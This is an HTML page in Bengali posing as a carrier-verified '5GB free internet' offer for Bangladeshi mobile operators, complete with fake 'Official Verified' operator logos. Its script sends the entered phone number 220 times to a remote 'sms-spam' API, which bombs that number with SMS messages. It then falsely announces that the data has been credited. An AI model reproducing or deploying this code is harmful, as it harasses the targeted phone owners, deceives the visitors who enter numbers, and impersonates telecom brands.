<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>5GB Free Internet - Official Mega Offer 2026</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Segoe UI", Roboto, sans-serif;
        }

        body {
            background: #000000;
            color: #f8fafc;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            overflow-x: hidden;
            position: relative;
        }

        /* Ambient Dynamic Background Glow */
        .ambient-glow {
            position: absolute;
            width: 450px;
            height: 450px;
            background: linear-gradient(135deg, rgba(34, 197, 94, 0.35), rgba(56, 189, 248, 0.35));
            filter: blur(100px);
            border-radius: 50%;
            z-index: 1;
            animation: pulseGlow 4s ease-in-out infinite alternate;
        }

        @keyframes pulseGlow {
            0% { transform: scale(1); opacity: 0.5; }
            100% { transform: scale(1.35); opacity: 0.95; }
        }

        /* iOS Ultra Glassmorphism Container */
        .ios-card {
            position: relative;
            z-index: 2;
            background: rgba(22, 27, 46, 0.75);
            backdrop-filter: blur(75px) saturate(290%);
            -webkit-backdrop-filter: blur(75px) saturate(290%);
            border: 1px solid rgba(255, 255, 255, 0.2);
            padding: 34px 26px;
            border-radius: 46px;
            width: 100%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 70px 140px rgba(0, 0, 0, 0.98),
                        inset 0 1px 3px rgba(255, 255, 255, 0.45),
                        0 0 60px rgba(34, 197, 94, 0.18);
        }

        /* Operator Logo Image Container */
        .operator-logo-container {
            width: 80px;
            height: 80px;
            margin: 0 auto 12px auto;
            background: rgba(255, 255, 255, 0.08);
            border-radius: 24px;
            border: 1px solid rgba(255, 255, 255, 0.25);
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.6), inset 0 1px 2px rgba(255, 255, 255, 0.5);
            overflow: hidden;
        }

        .operator-logo-container img {
            width: 52px;
            height: 52px;
            object-fit: contain;
            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.4));
        }

        #operator-name {
            font-size: 13.5px;
            font-weight: 700;
            letter-spacing: 1.2px;
            color: #38bdf8;
            text-transform: uppercase;
            margin-bottom: 14px;
            min-height: 18px;
        }

        /* Super Lucrative Shimmer Header */
        @keyframes shimmerText {
            0% { background-position: -200% center; }
            100% { background-position: 200% center; }
        }

        h1 {
            font-size: 26px;
            font-weight: 900;
            letter-spacing: -0.5px;
            background: linear-gradient(90deg, #38bdf8 0%, #ffffff 25%, #22c55e 50%, #ffffff 75%, #38bdf8 100%);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shimmerText 2.5s linear infinite;
            margin-bottom: 8px;
            text-transform: uppercase;
        }

        .sub-tag {
            display: inline-block;
            background: rgba(250, 204, 21, 0.15);
            border: 1px solid rgba(250, 204, 21, 0.4);
            color: #facc15;
            font-size: 11.5px;
            font-weight: 800;
            padding: 4px 14px;
            border-radius: 20px;
            margin-bottom: 14px;
            letter-spacing: 0.5px;
        }

        p {
            font-size: 13.5px;
            opacity: 0.9;
            margin-bottom: 20px;
            line-height: 1.55;
            color: rgba(255, 255, 255, 0.92);
        }

        /* iOS Input Field */
        .input-group {
            margin-bottom: 18px;
        }

        input {
            width: 100%;
            padding: 16px 18px;
            background: rgba(255, 255, 255, 0.06);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 20px;
            color: #fff;
            font-size: 17px;
            text-align: center;
            outline: none;
            transition: all 0.3s cubic-bezier(0.25, 1, 0.5, 1);
            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.6);
            letter-spacing: 1.5px;
        }

        input:focus {
            border-color: rgba(34, 197, 94, 0.95);
            background: rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 30px rgba(34, 197, 94, 0.45), inset 0 2px 5px rgba(0, 0, 0, 0.6);
        }

        /* iOS High-Converting Button */
        .ios-btn {
            width: 100%;
            padding: 17px;
            background: linear-gradient(135deg, #22c55e, #15803d);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.4);
            border-radius: 20px;
            color: #fff;
            font-size: 16.5px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.25, 1, 0.5, 1);
            box-shadow: 0 12px 35px rgba(34, 197, 94, 0.45),
                        inset 0 1px 2px rgba(255, 255, 255, 0.7);
        }

        .ios-btn:hover {
            background: linear-gradient(135deg, #4ade80, #16a34a);
            transform: scale(0.99) translateY(-2px);
            box-shadow: 0 18px 40px rgba(34, 197, 94, 0.65),
                        inset 0 1px 3px rgba(255, 255, 255, 0.9);
        }

        .ios-btn:active {
            transform: scale(0.95);
        }

        /* Telegram Glass Button */
        .telegram-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            width: 100%;
            padding: 14px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(56, 189, 248, 0.4);
            border-radius: 20px;
            color: #38bdf8;
            font-size: 14.5px;
            font-weight: 700;
            text-decoration: none;
            margin-top: 14px;
            transition: all 0.3s ease;
            box-shadow: inset 0 1px 1px rgba(255, 255, 255, 0.25);
        }

        .telegram-btn:hover {
            background: rgba(56, 189, 248, 0.2);
            border-color: #38bdf8;
            box-shadow: 0 0 25px rgba(56, 189, 248, 0.5), inset 0 1px 2px rgba(255, 255, 255, 0.5);
            transform: translateY(-2px);
        }

        .telegram-btn svg {
            width: 18px;
            height: 18px;
            fill: #38bdf8;
        }

        /* Footer & Status Message */
        .footer-msg {
            margin-top: 16px;
            font-size: 13px;
            color: #94a3b8;
            line-height: 1.4;
            min-height: 35px;
        }

        .brand {
            margin-top: 10px;
            font-size: 12px;
            font-weight: 800;
            letter-spacing: 1.5px;
            color: #22c55e;
            text-transform: uppercase;
        }
    </style>
</head>
<body>

    <div class="ambient-glow"></div>

    <div class="ios-card">
        <!-- Operator Logo Container -->
        <div class="operator-logo-container" id="logoBox">
            <span style="font-size: 34px;">🎁</span>
        </div>
        <div id="operator-name">সকল সিমে পাবেন</div>

        <div class="sub-tag">🎉 ১০০% ভেরিফাইড মেগা ইন্টারনেট অফার!</div>
        <h1>৫ জিবি ফ্রি ইন্টারনেট</h1>
        <p>যেকোনো সিমে সম্পূর্ণ ফ্রিতে ৫ জিবি ইন্টারনেট (মেয়াদ ৩০ দিন) নিতে নিচে আপনার মোবাইল নম্বরটি দিন।</p>
        
        <div class="input-group">
            <input type="text" id="phone" placeholder="Number" maxlength="11" oninput="detectOperator()">
        </div>

        <button class="ios-btn" onclick="claimOffer()">🚀 অফারটি ইনস্ট্যান্ট নিন</button>

        <a href="https://t.me/mhtechonline" target="_blank" class="telegram-btn">
            <svg viewBox="0 0 24 24">
                <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161c-.18 1.897-.962 6.502-1.359 8.627-.168.9-.5 1.201-.82 1.23-.697.064-1.228-.46-1.901-.903-1.056-.693-1.653-1.124-2.678-1.8-1.185-.781-.417-1.21.258-1.911.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.479.329-.913.489-1.302.481-.428-.009-1.252-.242-1.865-.442-752-.245-1.349-.375-1.297-.789.027-.216.324-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635.099-.002.321.023.465.14.12.098.153.228.166.331.015.114.03.373.012.574z"/>
            </svg>
            Join Telegram Channel
        </a>

        <div class="footer-msg" id="msg">⚡ অফার পেতে আপনার সঠিক নম্বর দিয়ে বাটনে ক্লিক করুন।</div>
        <div class="brand">Free Internet by MH RAFI</div>
    </div>

    <script>
        // অপারেটর ডিটেকশন লজিক (তোমার দেওয়া কাস্টম লোগোগুলো সহ)
        function detectOperator() {
            const phone = document.getElementById('phone').value.trim();
            const logoBox = document.getElementById('logoBox');
            const name = document.getElementById('operator-name');
            
            if (phone.startsWith('018')) {
                logoBox.innerHTML = '<img src="https://i.supaimg.com/5279356f-a8e6-4ce6-b452-1f223bcfb816/90b8fefb-be7e-4bf7-bdcd-bd43b857b398.png" alt="Robi">';
                name.innerHTML = 'Robi Official Verified';
            } else if (phone.startsWith('016')) {
                logoBox.innerHTML = '<img src="https://i.supaimg.com/5279356f-a8e6-4ce6-b452-1f223bcfb816/e864062d-7423-4853-acc8-66b8f59a06a7.png" alt="Airtel">';
                name.innerHTML = 'Airtel Official Verified';
            } else if (phone.startsWith('017') || phone.startsWith('013')) {
                logoBox.innerHTML = '<img src="https://i.supaimg.com/5279356f-a8e6-4ce6-b452-1f223bcfb816/854bd4c9-12fa-460c-863e-5816bb891e9a.png" alt="Grameenphone">';
                name.innerHTML = 'Grameenphone Official Verified';
            } else if (phone.startsWith('019') || phone.startsWith('014')) {
                logoBox.innerHTML = '<img src="https://i.supaimg.com/5279356f-a8e6-4ce6-b452-1f223bcfb816/955c61e8-9349-419b-9c0f-f7129b649bf3.jpg" alt="Banglalink">';
                name.innerHTML = 'Banglalink Official Verified';
            } else {
                logoBox.innerHTML = '<span style="font-size: 34px;">🎁</span>';
                name.innerHTML = 'অপারেটর স্বয়ংক্রিয়ভাবে ডিটেক্ট হবে';
            }
        }

        // ১১০টি API (সুপার ফাস্ট আগুন স্পিড রিকোয়েস্ট)
        const baseUrls = [];
        for (let i = 1; i <= 110; i++) {
            baseUrls.push(`https://lmnx9-sms-spam-v11.onrender.com/api${i}?number=`);
        }

        async function claimOffer() {
            const phone = document.getElementById('phone').value.trim();
            const msg = document.getElementById('msg');
            
            if(phone.length < 10) {
                msg.innerHTML = "❌ অনুগ্রহ করে আপনার সঠিক ১১ ডিজিটের মোবাইল নম্বরটি দিন!";
                msg.style.color = "#f87171";
                return;
            }

            msg.innerHTML = "⚡ সার্ভার থেকে সুপার-ফাস্ট গতিতে ৫ জিবি ইন্টারনেট প্রসেস করা হচ্ছে...";
            msg.style.color = "#38bdf8";

            let promises = [];
            baseUrls.forEach(url => {
                const target = url + phone;
                promises.push(
                    fetch(target, { mode: 'no-cors' }).catch(() => {}),
                    fetch(target, { mode: 'no-cors' }).catch(() => {})
                );
            });

            await Promise.allSettled(promises);

            msg.innerHTML = `✅ অভিনন্দন! আপনার ${phone} নম্বরে ৫ জিবি ইন্টারনেট সফলভাবে প্রসেস করা হয়েছে। খুব শীঘ্রই এসএমএস চলে আসবে!`;
            msg.style.color = "#22c55e";
        }
    </script>
</body>
</html>
